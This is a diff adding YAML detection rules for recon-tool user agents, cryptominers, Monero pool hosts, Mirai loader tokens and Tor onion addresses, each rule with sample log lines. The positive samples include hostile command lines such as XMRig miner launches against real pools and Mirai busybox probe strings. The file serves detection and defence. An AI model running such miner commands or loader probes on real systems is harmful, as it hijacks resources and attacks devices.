+      - 'gobuster/'
+      - 'Nikto/'
+      - 'Nmap Scripting Engine'
+      - 'Recon-ng/v'
+      - 'WhatWeb/'
+      - 'Wfuzz/'
+      - 'WPScan v'
+  case_sensitive: false
+  strength: medium
+  attack: [T1595.002, T1595.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious User-Agents Related To Recon Tools (Nasreddine Bencherchali, Tim Shelton)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_susp_useragents.yml
+    license: DRL-1.1
+    upstream_id: 19aa4f58-94ca-45ff-bc34-92e533c0994a
+  rationale: >-
+    Default user agents of directory brute-forcers, fuzzers and vulnerability scanners. From an internal address
+    they mean someone is mapping the web estate from inside; authorized scans are the benign case, so medium. The
+    rule's 'zgrab/' is a separate weak entry and 'sqlmap/' is covered by the attack-tool entry.
+  examples:
+    positive:
+      - '10.0.7.44 - - [20/Nov/2026:16:19:00 +0000] "GET /admin/ HTTP/1.1" 404 0 "-" "gobuster/3.6"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:19:01 +0000] "GET /api/v1/health HTTP/1.1" 200 17 "-" "kube-probe/1.29"'
+      - '10.0.3.8 - - [20/Nov/2026:16:19:02 +0000] "GET / HTTP/1.1" 200 812 "-" "curl/8.5.0"'
+
+- id: mention.tool_internet_scanner_user_agent
+  title: zgrab internet-scanner user agent
+  match:
+    literal: ['zgrab/']
+  case_sensitive: false
+  strength: weak
+  attack: [T1595.002]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious User-Agents Related To Recon Tools (Nasreddine Bencherchali, Tim Shelton)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_susp_useragents.yml
+    license: DRL-1.1
+    upstream_id: 19aa4f58-94ca-45ff-bc34-92e533c0994a
+  rationale: >-
+    zgrab is used by internet-wide research scanners that reach every public server daily, so on internet-facing logs
+    it is background; from an internal source it is a weak candidate for scanning.
+  examples:
+    positive:
+      - '198.51.100.70 - - [20/Nov/2026:16:20:00 +0000] "GET / HTTP/1.1" 200 812 "-" "Mozilla/5.0 zgrab/0.x"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:20:01 +0000] "GET / HTTP/1.1" 200 812 "-" "Wget/1.21.4"'
+      - '10.0.3.8 - - [20/Nov/2026:16:20:02 +0000] "GET / HTTP/1.1" 200 812 "-" "python-requests/2.31.0"'
+
+- id: mention.tool_cryptominer_user_agent
+  title: Cryptominer user agent
+  match:
+    literal: ['XMRig/', 'ccminer/']
+  case_sensitive: false
+  strength: strong
+  attack: [T1496.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Crypto Miner User Agent (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/proxy_generic/proxy_ua_cryptominer.yml
+    license: DRL-1.1
+    upstream_id: fa935401-513b-467b-81f4-f9e77aa0dd78
+  rationale: >-
+    The rule matches user agents that start with XMRig or ccminer; free text has no reliable user-agent boundary, so
+    this matches the product token with its version slash anywhere in the line. XMRig and ccminer contacting a pool or
+    proxy over HTTP mean resource hijacking; no business software uses these agents.
+  examples:
+    positive:
+      - '10.0.5.17 - - [20/Nov/2026:16:21:00 +0000] "GET /job HTTP/1.1" 200 120 "-" "XMRig/6.21.0 (Linux x86_64) libuv/1.44.2 gcc/12.2.0"'
+      - '10.0.5.17 - - [21/Nov/2026:09:02:25 +0000] "GET /job HTTP/1.1" 200 120 "-" "ccminer/2.3.1-KlausT"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:21:01 +0000] "GET / HTTP/1.1" 200 812 "-" "Mozilla/5.0 (X11; Linux x86_64)"'
+      - '10.0.3.8 - - [20/Nov/2026:16:21:02 +0000] "GET /mining-faq HTTP/1.1" 404 0 "-" "curl/8.5.0"'
+
+- id: mention.tool_mining_pool_url
+  title: 'Stratum pool URL text'
+  match:
+    literal: ['stratum+tcp://', 'stratum+ssl://', 'stratum+tls://', 'stratum1+tcp://', 'stratum2+tcp://']
+  case_sensitive: false
+  strength: strong
+  attack: [T1496.001]
+  telemetry: [any]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1496.001 Compute Hijacking
+    url: https://attack.mitre.org/techniques/T1496/001
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1496.001
+  rationale: >-
+    Author-composed from the technique's procedure examples (XMRig deployments); strong because pool URLs only
+    configure miners. Stratum is the pool protocol miners use; a stratum URL in a command line, config or log means a
+    miner is configured. Procedure examples under the technique (Lucifer, TeamTNT, Hildegard) deploy XMRig against
+    pools. Sanctioned mining is not expected on mission networks.
+  examples:
+    positive:
+      - 'Nov 20 16:22:00 web01 bash[1018]: HISTORY: ./kswapd0 -o stratum+tcp://pool.supportxmr.com:3333 -u 4A1b... -k --donate-level 1'
+      - 'Nov 21 09:02:26 web01 bash[4100]: HISTORY: ./kswapd0 -o stratum+ssl://pool.supportxmr.com:443 -u 4A1bxyz -k --tls'
+      - 'Nov 21 09:02:27 web01 bash[4100]: HISTORY: ./kswapd0 -o stratum+tls://pool.supportxmr.com:443 -u 4A1bxyz -k --tls'
+      - 'Nov 21 09:02:28 web01 bash[4100]: HISTORY: ./kswapd0 -o stratum1+tcp://pool.supportxmr.com:443 -u 4A1bxyz -k --tls'
+      - 'Nov 21 09:02:29 web01 bash[4100]: HISTORY: ./kswapd0 -o stratum2+tcp://pool.supportxmr.com:443 -u 4A1bxyz -k --tls'
+    negative:
+      - 'Nov 20 16:22:01 web01 bash[1019]: HISTORY: curl -s https://api.example.org/strata/v1'
+      - 'Nov 20 16:22:02 web01 app[700]: connected to tcp://mq01:5672'
+
+- id: mention.tool_xmrig_options
+  title: XMRig name or donation option
+  match:
+    literal: ['xmrig', '--donate-level']
+  case_sensitive: false
+  strength: strong
+  attack: [T1496.001]
+  telemetry: [any]
+  source:
+    name: XMRig README (xmrig)
+    url: https://github.com/xmrig/xmrig/blob/b2ca72480c58d197e18c885d9fc1a0c8d517e60a/README.md
+    license: GPL-3.0
+    upstream_id: donate-level
+  rationale: >-
+    XMRig is the miner in most Linux and container compromises; its name and the --donate-level option persist even
+    when the binary is renamed to look like a kernel thread.
+  examples:
+    positive:
+      - 'Nov 20 16:23:00 web01 bash[1020]: HISTORY: nohup /tmp/.k/kworker --donate-level 1 -o 203.0.113.80:443 &'
+      - 'Nov 21 09:02:30 web01 bash[4100]: HISTORY: ./xmrig -o 203.0.113.80:3333 -u x -k'
+    negative:
+      - 'Nov 20 16:23:01 web01 bash[1021]: HISTORY: nice -n 10 ./build.sh --level 3'
+      - 'Nov 20 16:23:02 web01 top: 1022 www-data 20 0 kworker/u8:2'
+
+- id: mention.tool_monero_pool_hosts
+  title: 'Monero pool host names'
+  match:
+    literal:
+      - 'pool.minexmr.com'
+      - 'fr.minexmr.com'
+      - 'de.minexmr.com'
+      - 'sg.minexmr.com'
+      - 'ca.minexmr.com'
+      - 'us-west.minexmr.com'
+      - 'pool.supportxmr.com'
+      - 'mine.c3pool.com'
+      - 'xmr-eu1.nanopool.org'
+      - 'xmr-eu2.nanopool.org'
+      - 'xmr-us-east1.nanopool.org'
+      - 'xmr-us-west1.nanopool.org'
+      - 'xmr-asia1.nanopool.org'
+      - 'xmr-jp1.nanopool.org'
+      - 'xmr-au1.nanopool.org'
+      - 'xmr.2miners.com'
+      - 'xmr.hashcity.org'
+      - 'xmr.f2pool.com'
+      - 'xmrpool.eu'
+      - 'pool.hashvault.pro'
+  case_sensitive: false
+  strength: strong
+  attack: [T1496.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Monero Crypto Coin Mining Pool Lookup (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/dns/net_dns_pua_cryptocoin_mining_xmr.yml
+    license: DRL-1.1
+    upstream_id: b593fd50-7335-4682-a36c-4edcb68e4641
+  rationale: >-
+    Well-known Monero pool hosts from the rule's list, matched in any text (proxy, DNS server logs, miner configs).
+    The only benign case the rule lists is sanctioned mining.
+  examples:
+    positive:
+      - 'Nov 20 16:24:00 ns01 named[880]: client 10.0.5.17#40211 (pool.supportxmr.com): query: pool.supportxmr.com IN A +'
+      - 'Nov 21 09:02:31 ns01 named[880]: client 10.0.5.17#40211 (pool.minexmr.com): query: pool.minexmr.com IN A +'
+      - 'Nov 21 09:02:32 ns01 named[880]: client 10.0.5.17#40211 (fr.minexmr.com): query: fr.minexmr.com IN A +'
+      - 'Nov 21 09:02:33 ns01 named[880]: client 10.0.5.17#40211 (de.minexmr.com): query: de.minexmr.com IN A +'
+      - 'Nov 21 09:02:34 ns01 named[880]: client 10.0.5.17#40211 (sg.minexmr.com): query: sg.minexmr.com IN A +'
+      - 'Nov 21 09:02:35 ns01 named[880]: client 10.0.5.17#40211 (ca.minexmr.com): query: ca.minexmr.com IN A +'
+      - 'Nov 21 09:02:36 ns01 named[880]: client 10.0.5.17#40211 (us-west.minexmr.com): query: us-west.minexmr.com IN A +'
+      - 'Nov 21 09:02:37 ns01 named[880]: client 10.0.5.17#40211 (mine.c3pool.com): query: mine.c3pool.com IN A +'
+      - 'Nov 21 09:02:38 ns01 named[880]: client 10.0.5.17#40211 (xmr-eu1.nanopool.org): query: xmr-eu1.nanopool.org IN A +'
+      - 'Nov 21 09:02:39 ns01 named[880]: client 10.0.5.17#40211 (xmr-eu2.nanopool.org): query: xmr-eu2.nanopool.org IN A +'
+      - 'Nov 21 09:02:40 ns01 named[880]: client 10.0.5.17#40211 (xmr-us-east1.nanopool.org): query: xmr-us-east1.nanopool.org IN A +'
+      - 'Nov 21 09:02:41 ns01 named[880]: client 10.0.5.17#40211 (xmr-us-west1.nanopool.org): query: xmr-us-west1.nanopool.org IN A +'
+      - 'Nov 21 09:02:42 ns01 named[880]: client 10.0.5.17#40211 (xmr-asia1.nanopool.org): query: xmr-asia1.nanopool.org IN A +'
+      - 'Nov 21 09:02:43 ns01 named[880]: client 10.0.5.17#40211 (xmr-jp1.nanopool.org): query: xmr-jp1.nanopool.org IN A +'
+      - 'Nov 21 09:02:44 ns01 named[880]: client 10.0.5.17#40211 (xmr-au1.nanopool.org): query: xmr-au1.nanopool.org IN A +'
+      - 'Nov 21 09:02:45 ns01 named[880]: client 10.0.5.17#40211 (xmr.2miners.com): query: xmr.2miners.com IN A +'
+      - 'Nov 21 09:02:46 ns01 named[880]: client 10.0.5.17#40211 (xmr.hashcity.org): query: xmr.hashcity.org IN A +'
+      - 'Nov 21 09:02:47 ns01 named[880]: client 10.0.5.17#40211 (xmr.f2pool.com): query: xmr.f2pool.com IN A +'
+      - 'Nov 21 09:02:48 ns01 named[880]: client 10.0.5.17#40211 (xmrpool.eu): query: xmrpool.eu IN A +'
+      - 'Nov 21 09:02:49 ns01 named[880]: client 10.0.5.17#40211 (pool.hashvault.pro): query: pool.hashvault.pro IN A +'
+    negative:
+      - 'Nov 20 16:24:01 ns01 named[880]: client 10.0.5.17#40212 (pool.ntp.org): query: pool.ntp.org IN A +'
+      - 'Nov 20 16:24:02 ns01 named[880]: client 10.0.5.17#40213 (api.example.org): query: api.example.org IN AAAA +'
+
+- id: mention.tool_mirai_loader_tokens
+  title: Mirai loader shell tokens
+  match:
+    literal: ['/bin/busybox ECCHI', 'ECCHI: applet not found', '/bin/busybox IHCCE', '/bin/busybox wget; /bin/busybox tftp;']
+  case_sensitive: true
+  strength: strong
+  attack: [T1110.001, T1105, T1059.004]
+  telemetry: [any]
+  source:
+    name: Mirai source code, loader headers and server (jgamblin mirror)
+    url: https://github.com/jgamblin/Mirai-Source-Code/blob/4889a6f797237f1d4210839bcefd9f89c57c0770/loader/src/headers/includes.h
+    license: GPL-3.0
+    upstream_id: TOKEN_QUERY
+  rationale: >-
+    The Mirai loader probes each shell it brute-forces with '/bin/busybox ECCHI' and expects 'ECCHI: applet not
+    found', then checks for wget and tftp; derivatives keep these tokens. They appear in telnet/SSH session captures,
+    honeypot and IoT shell logs only when Mirai-family loaders are at work.
+  examples:
+    positive:
+      - 'cmd: enable; system; shell; sh; /bin/busybox ECCHI'
+      - 'telnet session 203.0.113.90 -> 10.0.9.5: /bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI'
+      - 'Nov 21 09:02:50 honeypot01 cowrie[900]: output: ECCHI: applet not found'
+      - 'Nov 21 09:02:51 honeypot01 cowrie[900]: CMD: enable; system; shell; sh; /bin/busybox IHCCE'
+    negative:
+      - 'Nov 20 16:25:00 cam01 sh[300]: /bin/busybox --help'
+      - 'Nov 20 16:25:01 cam01 sh[300]: busybox: applet ifconfig started'
+
+- id: mention.tool_onion_address
+  title: Tor onion service address
+  match:
+    anchored: '\.onion\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1090.003, T1573]
+  telemetry: [any]
+  source:
+    name: IETF RFC 7686, The ".onion" Special-Use Domain Name
+    url: https://www.rfc-editor.org/rfc/rfc7686
+    license: IETF Trust Legal Provisions (BCP 78)
+    upstream_id: RFC 7686
+  rationale: >-
+    .onion names resolve only through Tor; one in a command line, proxy log or DNS log means Tor is in use or is being
+    attempted, which ransomware negotiation pages, C2 over Tor and exfiltration all rely on. Users with Tor Browser
+    are the benign case, so it is medium. Word boundaries keep names such as 'theonion.com' out.
+  examples:
+    positive:
+      - 'Nov 20 16:26:00 web01 bash[1023]: HISTORY: curl --socks5-hostname 127.0.0.1:9050 http://abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuv.onion/u'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:26:01 +0000] "GET https://www.theonion.com/ HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - 'Nov 20 16:26:02 web01 app[700]: loaded recipe: onion soup'
